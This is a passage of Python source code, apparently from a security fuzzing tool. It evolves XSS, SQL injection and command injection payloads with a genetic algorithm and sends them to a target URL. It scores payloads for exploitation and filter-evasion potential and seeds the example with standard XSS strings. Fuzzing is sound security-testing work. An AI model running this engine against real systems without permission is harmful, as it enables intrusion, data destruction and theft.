        elif payload.payload_type == PayloadType.SQL_INJECTION:
            return self._mutate_sql
        elif payload.payload_type == PayloadType.COMMAND_INJECTION:
            return self._mutate_command
        elif payload.payload_type == PayloadType.PATH_TRAVERSAL:
            return self._mutate_path
        else:
            return self._mutate_general

    def _select_alternative_mutation(self, payload: GeneticPayload) -> Callable:
        """Select alternative mutation when current path is dead end."""
        # Try different mutation types
        if payload.payload_type == PayloadType.XSS:
            mutations = [self._mutate_xss, self._mutate_general]
        elif payload.payload_type == PayloadType.SQL_INJECTION:
            mutations = [self._mutate_sql, self._mutate_general]
        else:
            mutations = [self._mutate_general]

        return self.prng.choice(mutations)

    def breadth_first_exploration(
        self, base_payloads: List[str], payload_type: PayloadType, max_depth: int = 3
    ) -> List[GeneticPayload]:
        """Perform breadth-first exploration of payload space."""
        exploration_results = []

        for depth in range(max_depth):
            logger.info(f"Starting breadth-first exploration at depth {depth}")

            # Generate variations at current depth
            current_payloads = (
                base_payloads
                if depth == 0
                else [p.payload for p in exploration_results[-1] if p.differential_score > 0.3]
            )

            if not current_payloads:
                logger.info(f"No promising payloads at depth {depth}, stopping exploration")
                break

            # Create population for this depth
            self.initialize_population(current_payloads, payload_type)

            # Set search path depth
            for payload in self.population:
                payload.search_path_depth = depth

            # Evolve with response-based fitness
            fitness_func = self.create_response_based_fitness(self.target_url or "")
            best_payloads = self.evolve(fitness_func)

            exploration_results.append(best_payloads)

            # Check if we found vulnerabilities
            high_scoring = [p for p in best_payloads if p.differential_score > 0.7]
            if high_scoring:
                logger.info(f"Found {len(high_scoring)} high-scoring payloads at depth {depth}")
                break

        return [p for batch in exploration_results for p in batch]

    def get_search_statistics(self) -> Dict[str, Any]:
        """Get statistics about search performance."""
        return {
            "total_paths": len(self.search_paths),
            "dead_end_paths": len(self.dead_end_paths),
            "successful_patterns": {k.value: len(v) for k, v in self.successful_patterns.items()},
            "mutation_success_rates": self.mutation_success_rates,
            "response_statistics": self.response_analyzer.get_statistics(),
        }

    def _calculate_population_diversity(self) -> float:
        """Calculate population diversity based on payload similarity."""
        if len(self.population) < 2:
            return 1.0
        
        similarities = []
        for i in range(len(self.population)):
            for j in range(i + 1, len(self.population)):
                payload1 = self.population[i].payload
                payload2 = self.population[j].payload
                
                # Calculate similarity using edit distance
                similarity = self._calculate_similarity(payload1, payload2)
                similarities.append(similarity)
        
        if not similarities:
            return 1.0
        
        avg_similarity = sum(similarities) / len(similarities)
        diversity = 1.0 - avg_similarity
        return max(0.0, min(1.0, diversity))

    def _calculate_similarity(self, payload1: str, payload2: str) -> float:
        """Calculate similarity between two payloads."""
        # Simple similarity based on common characters
        set1 = set(payload1)
        set2 = set(payload2)
        
        if not set1 and not set2:
            return 1.0
        
        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))
        
        return intersection / union if union > 0 else 0.0

    def _calculate_fitness_convergence(self) -> float:
        """Calculate fitness convergence in the population."""
        if len(self.population) < 2:
            return 0.0
        
        fitnesses = [p.fitness for p in self.population]
        mean_fitness = sum(fitnesses) / len(fitnesses)
        
        # Calculate coefficient of variation
        variance = sum((f - mean_fitness) ** 2 for f in fitnesses) / len(fitnesses)
        std_dev = variance ** 0.5
        
        if mean_fitness == 0:
            return 1.0
        
        cv = std_dev / mean_fitness
        return min(1.0, cv)

    def _adapt_mutation_rate(self) -> float:
        """Adapt mutation rate based on population diversity and convergence."""
        if not self.adaptive_mutation:
            return self.mutation_rate
        
        diversity = self._calculate_population_diversity()
        convergence = self._calculate_fitness_convergence()
        
        # High diversity + low convergence = lower mutation rate
        # Low diversity + high convergence = higher mutation rate
        diversity_factor = 1.0 - diversity
        convergence_factor = convergence
        
        # Combine factors
        adaptation_factor = (diversity_factor + convergence_factor) / 2
        
        # Calculate new mutation rate
        new_rate = self.min_mutation_rate + (self.max_mutation_rate - self.min_mutation_rate) * adaptation_factor
        
        # Log adaptation for debugging
        logger.debug(f"Adaptive mutation: diversity={diversity:.3f}, convergence={convergence:.3f}, "
                    f"rate={new_rate:.3f}")
        
        return new_rate

    def create_multi_objective_fitness(
        self, 
        target_url: str, 
        objectives: List[str] = None,
        weights: List[float] = None
    ) -> Callable:
        """Create a multi-objective fitness function."""
        if objectives is None:
            objectives = ["vulnerability_detection", "response_differential", "payload_complexity"]
        
        if weights is None:
            weights = [0.4, 0.4, 0.2]  # Equal weighting
        
        # Normalize weights
        total_weight = sum(weights)
        weights = [w / total_weight for w in weights]
        
        def multi_objective_fitness(payload: GeneticPayload) -> float:
            scores = []
            
            for objective in objectives:
                if objective == "vulnerability_detection":
                    score = self._calculate_vulnerability_score(payload)
                elif objective == "response_differential":
                    score = self._calculate_differential_score(payload, target_url)
                elif objective == "payload_complexity":
                    score = self._calculate_complexity_score(payload)
                elif objective == "exploitation_potential":
                    score = self._calculate_exploitation_score(payload)
                elif objective == "evasion_potential":
                    score = self._calculate_evasion_score(payload)
                else:
                    score = 0.0
                
                scores.append(score)
            
            # Weighted sum
            fitness = sum(score * weight for score, weight in zip(scores, weights))
            return min(1.0, max(0.0, fitness))
        
        return multi_objective_fitness

    def _calculate_vulnerability_score(self, payload: GeneticPayload) -> float:
        """Calculate vulnerability detection score."""
        score = 0.0
        
        # Check for vulnerability indicators in payload
        if payload.payload_type == PayloadType.SQL_INJECTION:
            sql_indicators = ["'", "OR", "AND", "UNION", "SELECT", "--", "#", "/*"]
            score += sum(0.1 for indicator in sql_indicators if indicator in payload.payload.upper())
        
        elif payload.payload_type == PayloadType.XSS:
            xss_indicators = ["<script>", "javascript:", "alert(", "onload=", "onerror="]
            score += sum(0.15 for indicator in xss_indicators if indicator.lower() in payload.payload.lower())
        
        elif payload.payload_type == PayloadType.COMMAND_INJECTION:
            cmd_indicators = [";", "&&", "|", "`", "$(", "ls", "cat", "whoami"]
            score += sum(0.1 for indicator in cmd_indicators if indicator in payload.payload)
        
        return min(1.0, score)

    def _calculate_differential_score(self, payload: GeneticPayload, target_url: str) -> float:
        """Calculate response differential score."""
        if not self.response_analyzer:
            return 0.0
        
        try:
            # Make request and analyze response
            import requests
            response = requests.get(f"{target_url}?input={payload.payload}", timeout=5)
            
            # Create response analysis
            analysis = self.response_analyzer.analyze_response(
                response.status_code,
                response.text,
                response.headers,
                response.elapsed.total_seconds()
            )
            
            # Compare with baseline if available
            if target_url in self.baseline_responses:
                differential = self.response_analyzer.compare_responses(
                    self.baseline_responses[target_url], analysis
                )
                return differential.reward_score
            
            return analysis.anomaly_score
            
        except Exception:
            return 0.0

    def _calculate_complexity_score(self, payload: GeneticPayload) -> float:
        """Calculate payload complexity score."""
        score = 0.0
        
        # Length complexity
        score += min(0.3, len(payload.payload) / 100.0)
        
        # Character diversity
        unique_chars = len(set(payload.payload))
        score += min(0.2, unique_chars / 50.0)
        
        # Special character usage
        special_chars = sum(1 for c in payload.payload if c in "'\"<>()[]{}|&;")
        score += min(0.3, special_chars / 10.0)
        
        # Encoding complexity
        if "%" in payload.payload:
            score += 0.2
        
        return min(1.0, score)

    def _calculate_exploitation_score(self, payload: GeneticPayload) -> float:
        """Calculate exploitation potential score."""
        score = 0.0
        
        # Check for high-impact payloads
        high_impact_patterns = [
            "DROP TABLE", "DELETE FROM", "INSERT INTO", "UPDATE SET",
            "document.cookie", "localStorage", "sessionStorage",
            "eval(", "exec(", "system("
        ]
        
        for pattern in high_impact_patterns:
            if pattern.lower() in payload.payload.lower():
                score += 0.3
        
        # Check for data exfiltration potential
        exfiltration_patterns = [
            "UNION SELECT", "OUTFILE", "DUMPFILE", "INTO OUTFILE",
            "fetch(", "XMLHttpRequest", "navigator.userAgent"
        ]
        
        for pattern in exfiltration_patterns:
            if pattern.lower() in payload.payload.lower():
                score += 0.2
        
        return min(1.0, score)

    def _calculate_evasion_score(self, payload: GeneticPayload) -> float:
        """Calculate evasion potential score."""
        score = 0.0
        
        # Encoding evasion
        if "%" in payload.payload or "&#" in payload.payload:
            score += 0.3
        
        # Case variation evasion
        if payload.payload != payload.payload.lower() and payload.payload != payload.payload.upper():
            score += 0.2
        
        # Whitespace evasion
        if " " in payload.payload or "\t" in payload.payload or "\n" in payload.payload:
            score += 0.2
        
        # Comment evasion
        if "--" in payload.payload or "/*" in payload.payload or "#" in payload.payload:
            score += 0.2
        
        # Null byte evasion
        if "\\x00" in payload.payload or "%00" in payload.payload:
            score += 0.1
        
        return min(1.0, score)


if __name__ == "__main__":
    # Example usage
    import logging

    logging.basicConfig(level=logging.INFO)

    # Initialize genetic mutator
    mutator = GeneticMutator(population_size=30, max_generations=20)

    # Base XSS payloads
    base_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ]

    # Initialize population
    mutator.initialize_population(base_payloads, PayloadType.XSS)

    # Define fitness function (example)
    def fitness_function(payload: GeneticPayload) -> float:
        # Simple fitness based on payload characteristics
        score = 0.0

        # Reward for having XSS indicators
        if any(
            indicator in payload.payload.lower() for indicator in ["script", "alert", "javascript"]
        ):
            score += 0.5

        # Reward for encoding
        if any(encoding in payload.payload for encoding in ["&lt;", "&gt;", "%3C", "%3E"]):
            score += 0.3

        # Reward for event handlers
        if any(event in payload.payload.lower() for event in ["onload", "onerror", "onclick"]):
            score += 0.4

        # Penalty for length (prefer shorter payloads)
        score -= len(payload.payload) * 0.01

        return max(0.0, score)

    # Evolve population
    best_payloads = mutator.evolve(fitness_function)

    print("Best payloads after evolution:")
    for i, payload in enumerate(best_payloads[:5]):
        print(f"{i + 1}. {payload.payload} (fitness: {payload.fitness:.3f})")
